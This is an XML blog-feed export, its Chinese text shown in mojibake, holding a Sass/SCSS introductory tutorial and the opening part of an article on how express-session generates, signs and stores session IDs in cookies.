Sass çš„èªæ³•åˆ†ç‚ºæ–°çš„ SCSS (Sassy CSSã€Sass 3ï¼Œæª”æ¡ˆåç¨±ç‚º *.scss) å’ŒèˆŠçš„ SASSï¼ˆå‘ Hamlå–ç¶“ï¼Œå…·å‚™ä¸ä½¿ç”¨å¤§æ‹¬å¼§æ ¼å¼ã€ä½¿ç”¨ç¸®æ’ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨ CSS èªæ³•ã€å­¸ç¿’æ›²ç·šè¼ƒé«˜ç­‰ç‰¹æ€§ï¼Œæª”æ¡ˆåç¨±ç‚º *.sassï¼‰ã€‚ç”±æ–¼æ–°çš„ SCSS èªæ³•æ˜¯ CSS3 çš„è¶…é›†åˆï¼Œæ‰€ä»¥å‚³çµ±çš„ CSS3 æª”æ¡ˆå°±ç®—ç›´æ¥è¤‡è£½éä¾†ä¹Ÿä¸æœƒå‡ºéŒ¯ï¼Œå­¸ç¿’æ›²ç·šç›¸å°è¼ƒç·©ï¼Œå› æ­¤æˆ‘å€‘å°‡ä½¿ç”¨ SCSS èªæ³•ã€‚ 
é—œæ–¼å…©è€…æ¯”è¼ƒçš„è£œå……å¯ä»¥åƒè€ƒé€™ç¯‡æ–‡ç«  Whatâ€™s the difference between SCSS and Sass?
SASS åˆé«”é©—åœ¨é–‹å§‹ä»‹ç´¹ SASS ç‰¹æ€§ä¹‹å‰ï¼Œæˆ‘å€‘å…ˆä¾†å­¸ç¿’å¦‚ä½•å°‡ Sass è½‰è­¯æˆ CSSã€‚
é¦–å…ˆï¼Œå…ˆæŒ‰ç…§å®˜ç¶²å…ˆè¡Œå®‰è£ Sassï¼Œæ¥è‘—åœ¨å°ˆæ¡ˆè³‡æ–™å¤¾å»ºç«‹ä¸€å€‹ main.scss æª”æ¡ˆï¼Œæª”æ¡ˆå…§å®¹å¦‚ä¸‹ï¼š
// å¼•ç”¨@import url(https://fonts.googleapis.com/css?family=Pacifico);//Add variables here:h1 &#123;  font-family: Roboto, sans-serif;  text-align: center;&#125;.banner &#123;  font-family: &#x27;Pacifico&#x27;, cursive;  height: 400px;  background-image: url(&quot;lemonade.jpg&quot;);&#125;.container &#123;  text-align: center;  font-family: &#x27;Pacifico&#x27;, cursive;&#125;

åœ¨çµ‚ç«¯æ©Ÿä¸‹ä»¥ä¸‹æŒ‡ä»¤é€²è¡Œè½‰è­¯ï¼š
// sass æŒ‡ä»¤ æ¬²è½‰è­¯æª”æ¡ˆ è¼¸å‡ºçš„æª”æ¡ˆsass main.scss main.css

æ­¤æ™‚ä½ å°±æœƒçœ‹åˆ°è³‡æ–™å¤¾ä¸­å¤šäº† main.css å’Œ main.css.map å…©å€‹æª”æ¡ˆï¼Œå‰è€…æ˜¯è½‰è­¯éå¾Œçš„ CSS æª”æ¡ˆï¼Œå¾Œè€…æ˜¯æ–¹ä¾¿ä½¿ç”¨ç€è¦½å™¨é™¤éŒ¯å·¥å…·é™¤éŒ¯æ™‚é€£çµåŸæª”æ¡ˆå’Œè½‰è­¯æª”æ¡ˆï¼Œæ–¹ä¾¿é™¤éŒ¯ã€‚

Variablesï¼šè®Šæ•¸å¯ä»¥ç”¨ä¾†å„²å­˜å€¼ï¼Œæ–¹ä¾¿é‡è¤‡åˆ©ç”¨
 æœ‰äº›æ™‚å€™ Variablesï¼Œé€™æ™‚å€™è‹¥èƒ½ä½¿ç”¨è®Šæ•¸å„²å­˜é‡è¤‡ä½¿ç”¨çš„å€¼å¯ä»¥å¢åŠ é‡ç”¨æ€§ã€‚åœ¨ Sass ä¸­æˆ‘å€‘ä½¿ç”¨ $ ä¾†è¡¨ç¤ºè®Šæ•¸ï¼Œè®Šæ•¸çš„è³‡æ–™å‹æ…‹å¯ä»¥æ˜¯ Numbersï¼ˆå¯ä»¥æœ‰å–®ä½æˆ–ç„¡å–®ä½ï¼‰ã€Stringsã€Booleansã€null å€¼ï¼ˆè¦–ç‚ºç©ºå€¼ï¼‰ï¼Œç”šè‡³å¯ä»¥ä½¿ç”¨ Listsã€Maps ä¾†ã€‚
 è®Šæ•¸çš„ä½¿ç”¨ï¼š
 $translucent-white: rgba(255,255,255,0.3);p &#123;	background-color: $translucent-white;&#125;

 Lists å¯ä»¥ç©ºæ ¼æˆ–åŠ é€—è™Ÿåˆ†éš”å±¬æ€§å€¼ï¼š
 $font-style-2: Helvetica, Arial, sans-serif;$standard-border: 4px solid black;p &#123;	border: $standard-border;&#125;// maps key:value$font-style-2: (key1: value1, key2: value2);	

Nestingï¼šé™ä½çˆ¶å…ƒç´ é‡è¤‡æ€§
 è½‰è­¯å‰ï¼š
 .parent &#123;  color: blue;  .child &#123;    font-size: 12px;  &#125;&#125;

 è½‰è­¯å¾Œï¼š
 .parent &#123;  color: blue;&#125;.parent .child &#123;    font-size: 12px;&#125;

 åœ¨ Nesting ä¸­ä¸åƒ…åªæœ‰ child selectors å¯ä»¥ä½¿ç”¨ï¼Œé‚„å¯ä»¥ä½¿ç”¨åœ¨ç›¸åŒçš„ Properties ä¸Šï¼š
 .parent &#123;  font : &#123;    family: Roboto, sans-serif;    size: 12px;    decoration: none;  &#125;&#125;

 è½‰è­¯å¾Œï¼š
 .parent &#123;  font-family: Roboto, sans-serif;  font-size: 12px;  font-decoration: none;&#125;
Mixinsï¼šé™ä½ pseudo å…ƒç´ æ’°å¯«çš„é‡è¤‡æ€§ï¼Œå¦‚ï¼š::beforeã€::afterã€:hoverï¼Œåœ¨ Sass ä¸­ä½¿ç”¨ &amp; ä»£è¡¨çˆ¶å…ƒç´ 
 è½‰è­¯å‰ï¼š
 .notecard&#123;   &amp;:hover&#123;      @include transform (rotatey(-180deg));      &#125;  &#125;

 è½‰è­¯å¾Œï¼š
 .notecard:hover &#123;  transform: rotatey(-180deg);&#125;

 é‡ç”¨ç¾¤çµ„çš„ CSSï¼Œä¾‹å¦‚è·¨ç€è¦½å™¨çš„ prefixï¼Œä½¿ç”¨ @include åŠ å…¥ç¾¤çµ„ï¼š
 è½‰è­¯å‰ï¼š
 @mixin backface-visibility &#123;  backface-visibility: hidden;  -webkit-backface-visibility: hidden;  -moz-backface-visibility: hidden;  -ms-backface-visibility: hidden;  -o-backface-visibility: hidden;&#125;.notecard &#123;  .front, .back &#123;    width: 100%;    height: 100%;    position: absolute;    @include backface_visibility;  &#125;&#125;

 è½‰è­¯å¾Œï¼š
 .notecard .front, .notecard .back &#123;  width: 100%;  height: 100%;  position: absolute;  backface-visibility: hidden;  -webkit-backface-visibility: hidden;   -moz-backface-visibility: hidden;  -ms-backface-visibility: hidden;  -o-backface-visibility: hidden;&#125;

 @mixin ä¹Ÿå¯ä»¥é€é @include ä½¿ç”¨åƒæ•¸ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é è¨­å€¼ï¼š
 @mixin backface-visibility($visibility:hidden) &#123; //Add an argument  backface-visibility: $visibility;  -webkit-backface-visibility: $visibility;  -moz-backface-visibility: $visibility;  -ms-backface-visibility: $visibility;  -o-backface-visibility: $visibility;&#125;.front, .back &#123;    @include backface-visibility(hidden);&#125;

 æœ‰æ™‚æˆ‘å€‘ä¹Ÿéœ€è¦è™•ç†åƒæ•¸è¤‡é›œçš„æƒ…å½¢ï¼Œæ­¤æ™‚å¯ä»¥ä½¿ç”¨ Listsã€Maps è³‡æ–™å‹æ…‹ç•¶è¼”åŠ©ï¼š
 @mixin stripes($direction, $width-percent, $stripe-color, $stripe-background: #FFF) &#123;  background: repeating-linear-gradient(    $direction,    $stripe-background,    $stripe-background ($width-percent - 1),    $stripe-color 1%,    $stripe-background $width-percent  );&#125;

 ä½¿ç”¨ Maps è³‡æ–™æ ¼å¼å­˜æ¬²å‚³å…¥è®Šæ•¸ï¼š
 $college-ruled-style: (     direction: to bottom,    width-percent: 15%,    stripe-color: blue,    stripe-background: white);

 è®Šæ•¸ä½¿ç”¨ ... é€²è¡Œå‚³éï¼š
 .definition &#123;      width: 100%;      height: 100%;      @include stripes($college-ruled-style...); &#125;

 é‚„æœ‰ç¨®æƒ…æ³æ˜¯åƒæ•¸å‚³å…¥ç•¶ä½œå­—ä¸²ï¼ˆString interpolationï¼‰ï¼š
 è½‰è­¯å‰ï¼š
 // ä½¿ç”¨ #&#123;$file&#125; æ¥æ”¶@mixin photo-content($file) &#123;  content: url(#&#123;$file&#125;.jpg); //string interpolation  object-fit: cover;&#125;.photo &#123;   @include photo-content(&#x27;titanosaur&#x27;);  width: 60%;  margin: 0px auto; &#125;

 è½‰è­¯å¾Œï¼š
 .photo &#123;   content: url(titanosaur.jpg);  width: 60%;  margin: 0px auto; &#125;

 æ›´å¯ä»¥æ­é… Nesting ä½¿ç”¨ï¼š
 @mixin hover-color($color) &#123;  		&amp;:hover &#123;   		color: $color;   	&#125;  	&#125;  	.word &#123;   	@include hover-color(red);  	&#125;

Functions 
 åœ¨ Sass å…§å»ºä¸€äº›å¥½ç”¨ functions å¯ä»¥ç°¡å–®è¨­å®šè‰²ç›¸ã€æ¼¸å±¤ï¼Œä¾‹å¦‚ï¼šadjust-hue($color, $degrees)ã€fade-outï¼š
 $lagoon-blue: fade-out(#62fdca, 0.5);

 æ›´å¤šå…§å»º Functions å¯ä»¥åƒè€ƒé€™é‚Š

Operationsï¼šé€éåŠ æ¸›ä¹˜é™¤å’Œå–é¤˜æ•¸ç­‰é‹ç®—å­å¯ä»¥æ–¹ä¾¿é‹ç®—æ‰€éœ€çš„å±¬æ€§å€¼
 é¡è‰²åŠ æ³•ï¼š
 $color: #010203 + #040506;/*	01 + 04 = 05	02 + 05 = 07	03 + 06 = 09	color: #050709;*/
 // ä½¿ç”¨ä¸Šéœ€è¦æ³¨æ„ï¼š
 width: $variable/6; //divisionline-height: (600px)/9; //divisionmargin-left: 20-10 px/ 2; //divisionfont-size: 10px/8px; //not division

 ä¹Ÿå¯ä»¥ä½¿ç”¨ @each èªæ³•è¿­ä»£ list å…§å®¹ï¼š
 $list: (orange, purple, teal);@each $item in $list &#123;  .#&#123;$item&#125; &#123;    background: $item;  &#125;&#125;

 ä½¿ç”¨ @for è¿­ä»£ï¼Œä¸¦åŠ å…¥æ¢ä»¶åˆ¤æ–·ï¼š
 @for $i from 1 through $total &#123;  .ray:nth-child(#&#123;$i&#125;) &#123;	background: adjust-hue(blue, $i * $step);	// 	width: if($i % 2 == 0, 300px, 350px); 		margin-left: if($i % 2 == 0, 0px, 50px);  &#125;&#125;

@include å¼•ç”¨ï¼šå¯ä»¥å¼•å…¥å…¶ä»– Sassã€SCSS æª”æ¡ˆï¼š
 æˆ‘å€‘é€šå¸¸ä½¿ç”¨ Partials å»è™•ç†ç‰¹å®šåŠŸèƒ½ï¼Œæ–¹ä¾¿ç®¡ç†å’Œç¶­è­·ã€‚ä»¥ä¸‹æ˜¯å¼•ç”¨ _variables.scss æª”æ¡ˆç¯„ä¾‹ï¼Œå…¶ä¸­æª”åå‰çš„ _ è¡¨ç¤ºå¼•ç”¨å‰è¦å…ˆ compileï¼š
 @import &quot;variables&quot;;
@extend å…±ç”¨ï¼š
 ç·¨è­¯å‰ï¼š
 .lemonade &#123;  border: 1px yellow;  background-color: #fdd;&#125;.strawberry &#123;  @extend .lemonade;  border-color: pink;&#125;

 è½‰è­¯å¾Œï¼š
 .lemonade, .strawberry &#123;  border: 1px yellow;  background-color: #fdd;&#125;.strawberry &#123;  @extend .lemonade;  border-color: pink;&#125;

 æ­é… Placeholders ä½¿ç”¨ï¼š
 è½‰è­¯å‰ï¼š
 a%drink &#123;	font-size: 2em;	background-color: $lemon-yellow;&#125;.lemonade &#123;	@extend %drink;	//more rules&#125;

 è½‰è­¯å¾Œ
 a.lemonade &#123;   	font-size: 2em;   	background-color: $lemon-yellow;	&#125;.lemonade &#123; 		//more rules&#125;

@mixin å’Œ @extend æ¯”è¼ƒ
 è½‰è­¯å‰ï¼š
 @mixin no-variable &#123;  font-size: 12px;  color: #FFF;  opacity: .9;&#125;%placeholder &#123;  font-size: 12px;  color: #FFF;  opacity: .9;&#125;span &#123;  @extend %placeholder;&#125;div &#123;  @extend %placeholder;&#125;p &#123;  @include no-variable;&#125;h1 &#123;  @include no-variable;&#125;

 è½‰è­¯å¾Œï¼š
 span, div&#123;  font-size: 12px;  color: #FFF;  opacity: .9;&#125;p &#123;  font-size: 12px;  color: #FFF;  opacity: .9;  //rules specific to ps&#125;h1 &#123;  font-size: 12px;  color: #FFF;  opacity: .9;  //rules specific to ps&#125;

Sass è³‡æ–™å¤¾çµæ§‹
 sass/	components/		_buttons.scss	helpers/		_variables.scss		_functions.scss		_mixins.scss	layout/		_grid.scss		_header.scss		_footer.scss	pages/		_home.scss		_contact.scss

ç¸½çµä»¥ä¸Šå°±æ˜¯ Sass&#x2F;SCSS ç°¡æ˜å…¥é–€æ•™å­¸ï¼Œåœ¨é€™ç¯‡æ–‡ç« ä¸­æˆ‘å€‘å¤§è‡´ä¸Šä»‹ç´¹äº† Sass ä½¿ç”¨èªæ³•ã€‚é™¤äº† Sass å¤–ï¼Œç›®å‰å¸‚é¢ä¸Šé‚„æœ‰è¨±å¤š CSS çš„è®Šå½¢ï¼ŒåŒ…æ‹¬èªæ³•è¼ƒæ˜“å­¸çš„ LESSã€å…ƒä»¶åŒ–æ€è€ƒçš„ CSS in JSã€ä¸»è¦è§£æ±ºå…¨åŸŸå•é¡Œå’Œæ¨¡çµ„å¼•ç”¨çš„ CSS Modulesï¼Œå–ç¶“æ–¼ JavaScript Task Runner çš„ PostCSS ã€ç¶²æ ¼æ¨£å¼è¡¨å–® GSS ç­‰ï¼Œé€™äº›æœ€çµ‚éƒ½æ˜¯è¦è§£æ±ºå‚³çµ± CSS ç¶­è­·ä¸æ˜“ã€é‡ç”¨æ€§ä½ä¸‹ç­‰å•é¡Œã€‚äº‹å¯¦ä¸Šï¼Œæœ‰äº›äººè¦ºå¾—ä½¿ç”¨ preprocessor è¼ƒå¥½ç¶­è­·ï¼Œæœ‰äº›äººèªç‚ºæ¯æ¬¡éƒ½è¦ç·¨è­¯å¾ˆéº»ç…©ï¼Œè‡³æ–¼è¦é¸æ“‡å“ªä¸€ç¨® CSS preprocessor æˆ–æ˜¯æ ¹æœ¬ä¸ä½¿ç”¨ï¼Œå–æ±ºæ–¼åœ˜éšŠçš„å…§éƒ¨è¦ç¯„å’Œè¨è«–ã€‚ä¿—è©±èªªå¾Œç«¯ä¸€å¤©ï¼Œå‰ç«¯ä¸€å¹´ï¼Œèªªä¸å®šç¾åœ¨é¸é‚Šç«™çš„æŠ€è¡“ï¼Œä¸‹å€‹æœˆå°±ä¸æµè¡Œäº†å‘¢ã€‚
å»¶ä¼¸é–±è®€
Sass &amp; Susyæ•™å­¸æ‰‹å†Š
learn-sass
CSS Modules ç”¨æ³•æ•™ç¨‹
å¦‚ä½•å¾ SASS ç„¡ç—›è½‰ç§»åˆ° POSTCSS
Using PostCSS Together with Sass, Stylus, or LESS
[å¿ƒå¾—] ä»€éº¼æ˜¯ postcss?
èŠèŠ CSS é è™•ç†å™¨ï¼ŒLESSã€Sassã€Stylus åŠ postCSS

é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>LESS, SASS, SCSS, Sass, PossCSS, CSS, OOCSS, CSS in JS, CSS Modules</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥ Session èˆ‡ Cookieï¼šExpressã€PHP èˆ‡ Rails çš„å¯¦ä½œ</title>
    <url>/2019/09/07/session-and-cookie-implementation/</url>
    <content><![CDATA[å‰è¨€é€™æ˜¯ä¸€ç³»åˆ—å…±ä¸‰ç¯‡çš„æ–‡ç« ï¼Œæˆ‘ç¨±ä¹‹ç‚º Session èˆ‡ Cookie ä¸‰éƒ¨æ›²ã€‚ç³»åˆ—æ–‡çš„ç›®æ¨™æ˜¯æƒ³è¦ç”±æ·ºå…¥æ·±ä¾†è«‡è«‡é€™å€‹ç¶“å…¸è­°é¡Œï¼Œå¾ç†è§£æ¦‚å¿µä¸€ç›´åˆ°ç†è§£å¯¦ä½œæ–¹å¼ã€‚é€™æ˜¯ç³»åˆ—æ–‡çš„æœ€å¾Œä¸€ç¯‡ï¼Œä¸‰ç¯‡çš„å®Œæ•´é€£çµå¦‚ä¸‹ï¼š

ç™½è©± Session èˆ‡ Cookieï¼šå¾ç¶“ç‡Ÿé›œè²¨åº—é–‹å§‹
æ·ºè«‡ Session èˆ‡ Cookieï¼šä¸€èµ·ä¾†è®€ RFC
æ·±å…¥ Session èˆ‡ Cookieï¼šExpressã€PHP èˆ‡ Rails çš„å¯¦ä½œ


ç¬¬ä¸€ç¯‡ä»¥ç™½è©±çš„æ–¹å¼ä¾†è«‡ Session èˆ‡ Cookieï¼Œå…¨ç¯‡æ²’æœ‰è«‡åˆ°å¤ªå¤šæŠ€è¡“åè©ï¼›ç¬¬äºŒç¯‡ç›´æ¥å»çœ‹ Cookie çš„ä¸‰ä»½ RFC ä¾†ç†è§£åˆ°åº•ä»€éº¼æ˜¯ Sessionï¼Œä¹Ÿè£œé½Šäº†ä¸€äº› Cookie ç›¸é—œçš„çŸ¥è­˜ã€‚è€Œé€™ä¸€ç¯‡å‰‡æ˜¯è¦æ·±å…¥ Sessionï¼Œä¸€èµ·å¸¶å¤§å®¶çœ‹çœ‹ä¸‰ç¨®ä¸åŒçš„ Session å¯¦ä½œæ–¹å¼ã€‚
é€™ä¸‰æ¨£åˆ†åˆ¥æ˜¯ Node.js çš„ Web æ¡†æ¶ Expressã€PHP ä»¥åŠ Ruby on Railsã€‚æœƒæŒ‘é¸é€™ä¸‰å€‹æ˜¯å› ç‚ºä»–å€‘å°æ–¼ Session æ©Ÿåˆ¶çš„å¯¦ä½œéƒ½ä¸åŒï¼Œæ˜¯æˆ‘è¦ºå¾—å¾ˆé©åˆæ‹¿ä¾†åƒè€ƒçš„å°è±¡ã€‚
å¥½ï¼Œæ¥è‘—å°±é–‹å§‹å§ï¼
ExpressExpress æœ¬èº«æ˜¯å€‹æ¥µåº¦è¼•é‡çš„æ¡†æ¶ï¼Œæœ‰è¨±å¤šå…¶ä»–æ¡†æ¶åº•ä¸‹çš„åŸºæœ¬åŠŸèƒ½ï¼Œåœ¨é€™é‚Šéƒ½è¦é¡å¤–å®‰è£ middleware æ‰èƒ½ä½¿ç”¨ã€‚
å…ˆä¾†ç°¡å–®ä»‹ç´¹ä¸€ä¸‹ middleware çš„æ¦‚å¿µã€‚åœ¨ Express è£¡é¢ï¼Œç•¶æ”¶åˆ°ä¸€å€‹ Request  ä¹‹å¾Œå°±æœƒè½‰äº¤çµ¦ç›¸å°æ‡‰çš„ middleware ä¾†åšè™•ç†ï¼Œè™•ç†å®Œä»¥å¾Œè®Šæˆ Response å›å‚³å›å»ã€‚æ‰€ä»¥ Express çš„æœ¬è³ªå…¶å¯¦å°±æ˜¯ä¸€å¤§å † middlewareã€‚
ç”¨åœ–è§£é‡‹çš„è©±æœƒé•·é€™æ¨£ï¼š

èˆ‰å€‹ä¾‹å­å¥½äº†ï¼Œä¸€æ®µåŸºæœ¬çš„ç¨‹å¼ç¢¼æœƒé•·é€™æ¨£ï¼š
const express = require(&#x27;express&#x27;)const app = express()const port = 5001  // global çš„ middlewareapp.use((req, res, next) =&gt; &#123;  req.greeting = &#x27;hello&#x27;  next()&#125;)  // ç‰¹å®š route çš„ middlewareapp.get(&#x27;/&#x27;, (req, res) =&gt; &#123;  res.end(req.greeting)&#125;)  app.listen(port, () =&gt; &#123;  console.log(`Example app listening on port $&#123;port&#125;!`)&#125;)

ç¬¬ä¸€å€‹ middleware æ˜¯ global çš„ï¼Œæ‰€ä»¥ä»»ä½• request éƒ½æœƒå…ˆåˆ°é”é€™å€‹ middlewareï¼Œè€Œé€™é‚Šå¯ä»¥å° req æˆ–æ˜¯ res é€™å…©å€‹åƒæ•¸è¨­ç½®ä¸€äº›æ±è¥¿ï¼Œæœ€å¾Œå‘¼å« next æŠŠæ§åˆ¶æ¬Šè½‰çµ¦ä¸‹ä¸€å€‹ middlewareã€‚
è€Œä¸‹ä¸€å€‹ middleware å°±å¯ä»¥æ‹¿åˆ°å‰é¢çš„ middleware è™•ç†éå¾Œçš„è³‡è¨Šï¼Œä¸¦ä¸”è¼¸å‡ºå…§å®¹ã€‚å¦‚æœæ²’æœ‰å‘¼å« nextï¼Œä»£è¡¨ä¸æƒ³æŠŠæ§åˆ¶æ¬Šè½‰ç§»çµ¦ä¸‹å€‹ middlewareã€‚
åœ¨ Express è£¡é¢ï¼Œç®¡ç† Session çš„ middleware æ˜¯ express-sessionï¼Œç¯„ä¾‹ç¨‹å¼ç¢¼é•·é€™æ¨£ï¼ˆæ”¹å¯«è‡ªå®˜ç¶²ç¯„ä¾‹ï¼‰ï¼š
const express = require(&#x27;express&#x27;)const session = require(&#x27;express-session&#x27;)  const app = express()const port = 5001  // ä½¿ç”¨ session middlewareapp.use(session(&#123;  secret: &#x27;keyboard cat&#x27;&#125;))   app.get(&#x27;/&#x27;, function(req, res, next) &#123;    // å¯ä»¥ç”¨ req.session æ‹¿å–å­˜åœ¨ session çš„å€¼  // é€™é‚Šåˆ¤æ–·æœ‰æ²’æœ‰ req.session.views  // å¦‚æœæœ‰çš„è©±å°± +1ï¼Œåä¹‹åˆå§‹åŒ–æˆ 1  // æ‰€ä»¥ req.session å¯è®€ä¹Ÿå¯å¯«  if (req.session.views) &#123;    req.session.views++    res.write(&#x27;views: &#x27; + req.session.views)    res.end()  &#125; else &#123;    req.session.views = 1    res.end(&#x27;welcome to the session demo. refresh!&#x27;)  &#125;&#125;)  app.listen(port, () =&gt; &#123;  console.log(`Example app listening on port $&#123;port&#125;!`)&#125;)

ä½¿ç”¨äº† session middleware ä»¥å¾Œï¼Œå¯ä»¥ç›´æ¥ç”¨ req.session.key ä¾†å­˜å–ä½ è¦çš„è³‡è¨Šï¼ŒåŒä¸€å€‹è®Šæ•¸å¯ä»¥å¯«å…¥ä¹Ÿå¯ä»¥è®€å–ï¼Œè·Ÿ PHP çš„ $_SESSION æœ‰ç•°æ›²åŒå·¥ä¹‹å¦™ã€‚
æ¥è‘—æˆ‘å€‘ä¾†çœ‹çœ‹ express-session çš„ç¨‹å¼ç¢¼å§ï¼ä¸»è¦çš„ç¨‹å¼ç¢¼éƒ½åœ¨ index.js é€™å€‹æª”æ¡ˆï¼Œå¤§æ¦‚æœ‰å¿«ä¸ƒç™¾è¡Œï¼Œä¸å¤ªå¯èƒ½ä¸€è¡Œä¸€è¡Œè¬›è§£ã€‚
è€Œä¸”å¯«å¾—å¥½çš„ libraryï¼ŒæœƒèŠ±å¾ˆå¤šç²¾åŠ›åœ¨å‘å¾Œç›¸å®¹ä»¥åŠè³‡æ–™åˆæ³•æ€§çš„æª¢æŸ¥ï¼Œé€™äº›éƒ½æ˜¯ä¸€äº›æ¯”è¼ƒç‘£ç¢è€Œä¸”å°æ–¼æƒ³è¦ç†è§£æ©Ÿåˆ¶æ¯”è¼ƒæ²’å¹«åŠ©çš„æ±è¥¿ã€‚
æ‰€ä»¥æˆ‘æœƒç›´æ¥æŠŠç¨‹å¼ç¢¼ç¨å¾®æ•´ç†ä¸€ä¸‹ï¼Œå»é™¤æ‰æ¯”è¼ƒä¸é‡è¦çš„éƒ¨åˆ†ä¸¦ä¸”é‡æ–°çµ„ç¹”ç¨‹å¼ç¢¼ï¼ŒåªæŒ‘å‡ºç›¸é—œçš„æ®µè½ã€‚
æˆ‘å€‘æœƒé—œæ³¨ä¸‰å€‹é‡é»ï¼š

sessionID å¦‚ä½•ç”¢ç”Ÿ
sessionID å„²å­˜æ–¹å¼
session è³‡è¨Šå„²å­˜æ–¹å¼

å¯ä»¥å…ˆä¾†çœ‹ç”¢ç”Ÿ sessionID çš„åœ°æ–¹ï¼š
// get the session id generate functionvar generateId = opts.genid || generateSessionId  // generates the new sessionstore.generate = function(req)&#123;  req.sessionID = generateId(req);  req.session = new Session(req);  req.session.cookie = new Cookie(cookieOptions);    if (cookieOptions.secure === &#x27;auto&#x27;) &#123;    req.session.cookie.secure = issecure(req, trustProxy);  &#125;&#125;;  function generateSessionId(sess) &#123;  return uid(24);&#125;

express-session çš„å®¢è£½åŒ–ç¨‹åº¦å¾ˆé«˜ï¼Œå¯ä»¥è‡ªå·±å‚³é€²å»ç”¢ç”Ÿ sessionID çš„å‡½å¼ã€‚è‹¥æ˜¯æ²’æœ‰å‚³ï¼Œé è¨­æœƒä½¿ç”¨ uid(24)ï¼Œé€™é‚Šçš„ uid æŒ‡çš„æ˜¯ uid-safe é€™å€‹ libraryï¼Œæœƒç”¢ç”Ÿä¸€å€‹é•·åº¦ç‚º 24 bytes çš„éš¨æ©Ÿ IDã€‚
æ–‡ä»¶ä¸Šæœ‰ç‰¹åˆ¥èªªæ˜é€™å€‹é•·åº¦ï¼š

Asynchronously create a UID with a specific byte length. Because base64 encoding is used underneath, this is not the string length. For example, to create a UID of length 24, you want a byte length of 18.

æ‰€ä»¥å¡«å…¥ 24ï¼Œæœ€å¾Œç”¢ç”Ÿå‡ºä¾†çš„æœƒæ˜¯é•·åº¦ç‚º 32 å€‹å­—å…ƒçš„å­—ä¸²ã€‚
é‚£é€™å€‹ sessionID æ˜¯ä»¥ä»€éº¼æ¨£çš„å½¢å¼å­˜é€² Cookie çš„å‘¢ï¼Ÿ
var cookie = require(&#x27;cookie&#x27;)var signature = require(&#x27;cookie-signature&#x27;)  // get the session cookie namevar name = opts.name || opts.key || &#x27;connect.sid&#x27;  // get the cookie signing secretvar secret = opts.secret  if (secret &amp;&amp; !Array.isArray(secret)) &#123;  secret = [secret];&#125;  // set-cookieonHeaders(res, function()&#123;    // set cookie  setcookie(res, name, req.sessionID, secrets[0], req.session.cookie.data);&#125;);  function setcookie(res, name, val, secret, options) &#123;  var signed = &#x27;s:&#x27; + signature.sign(val, secret);  var data = cookie.serialize(name, signed, options);    debug(&#x27;set-cookie %s&#x27;, data);    var prev = res.getHeader(&#x27;Set-Cookie&#x27;) || []  var header = Array.isArray(prev) ? prev.concat(data) : [prev, data];    res.setHeader(&#x27;Set-Cookie&#x27;, header)&#125;

å­˜åœ¨ cookie è£¡é¢çš„ sessionID çš„ key ä¸€æ¨£å¯ä»¥è‡ªå·±æŒ‡å®šï¼Œä½†é è¨­æœƒæ˜¯ connect.sidï¼Œæ‰€ä»¥ä»¥å¾Œä¸€çœ‹åˆ°é€™å€‹ key å°±çŸ¥é“é€™æ˜¯ express-session é è¨­çš„ sessionID åç¨±ã€‚
å…§å®¹çš„éƒ¨åˆ†æ¯”è¼ƒç‰¹åˆ¥ä¸€é»ï¼Œæœƒä»¥ s: é–‹é ­ï¼Œå¾Œé¢æ¥ä¸Š signature.sign(sessionID, secret) çš„çµæœã€‚
é€™é‚Šè¦å†çœ‹åˆ° cookie-signature é€™å€‹ libraryï¼Œåº•ä¸‹æ˜¯ä¸€å€‹ç°¡å–®ç¯„ä¾‹ï¼š
var cookie = require(&#x27;cookie-signature&#x27;);  var val = cookie.sign(&#x27;hello&#x27;, &#x27;tobiiscool&#x27;);val.should.equal(&#x27;hello.DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI&#x27;);

é€™é‚Šçš„ sign åˆ°åº•åšäº†ä»€éº¼å‘¢ï¼ŸåŸå§‹ç¢¼å¾ˆç°¡å–®ï¼Œå¯ä»¥ç¨å¾®çœ‹ä¸€ä¸‹ï¼š
var crypto = require(&#x27;crypto&#x27;);  /** * Sign the given `val` with `secret`. * * @param &#123;String&#125; val * @param &#123;String&#125; secret * @return &#123;String&#125; * @api private */  exports.sign = function(val, secret)&#123;  if (&#x27;string&#x27; != typeof val) throw new TypeError(&quot;Cookie value must be provided as a string.&quot;);  if (&#x27;string&#x27; != typeof secret) throw new TypeError(&quot;Secret string must be provided.&quot;);  return val + &#x27;.&#x27; + crypto    .createHmac(&#x27;sha256&#x27;, secret)    .update(val)    .digest(&#x27;base64&#x27;)    .replace(/\=+$/, &#x27;&#x27;);&#125;;

å°±åªæ˜¯æŠŠä½ è¦ sign çš„å…§å®¹ç”¨ hmac-sha256 ç”¢ç”Ÿä¸€å€‹é‘‘åˆ¥ç¢¼ï¼Œä¸¦ä¸”åŠ åœ¨å­—ä¸²å¾Œé¢è€Œå·²ï¼Œä¸­é–“æœƒç”¨.ä¾†åˆ†å‰²è³‡æ–™ã€‚
è‹¥æ˜¯ä½ ä¸çŸ¥é“ä»€éº¼æ˜¯ hmac çš„è©±æˆ‘ç¨å¾®æä¸€ä¸‹ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯å¯ä»¥å°ä¸€ä¸²è¨Šæ¯ç”¢ç”Ÿé‘‘åˆ¥ç¢¼ï¼Œç›®çš„æ˜¯ç‚ºäº†ä¿æŒè³‡æ–™çš„å®Œæ•´æ€§è®“å®ƒä¸è¢«ç«„æ”¹ã€‚ä½ å¯ä»¥æƒ³æˆå®ƒå°±æ˜¯è¨Šæ¯å°æ‡‰åˆ°çš„ä¸€çµ„ç¨ä¸€ç„¡äºŒçš„ä»£ç¢¼ï¼Œå¦‚æœè¨Šæ¯è¢«æ”¹æ‰äº†ï¼Œä»£ç¢¼ä¹Ÿæœƒä¸ä¸€æ¨£ã€‚
